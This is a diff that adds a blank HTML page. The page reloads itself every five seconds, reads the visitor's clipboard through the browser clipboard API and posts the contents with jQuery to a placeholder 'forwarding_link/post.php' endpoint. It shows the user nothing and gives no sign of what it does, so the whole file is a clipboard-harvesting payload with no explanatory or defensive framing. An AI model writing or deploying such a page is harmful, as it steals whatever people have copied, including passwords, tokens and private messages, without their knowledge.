@@ -1,0 +1,39 @@
+<HTML>
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<meta http-equiv="refresh" content="5">
+<HEAD>
+</HEAD>
+<BODY>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<script>
+
+function post(dataclip){
+$.ajax({
+    type: 'POST',
+    data: { cat: dataclip
+        },
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+
+    success: function(result){
+        // call the function that handles the response/results
+
+    },
+
+    error: function(){
+
+    }
+  });
+};
+
+navigator.clipboard.readText().then(text => document.querySelector(".clipboard-results").innerText = post(text));
+// or just navigator.clipboard.readText().then(text => post(text));
+
+</script>
+
+</head>
+ <body>
+ 
+</BODY>
+</HTML>
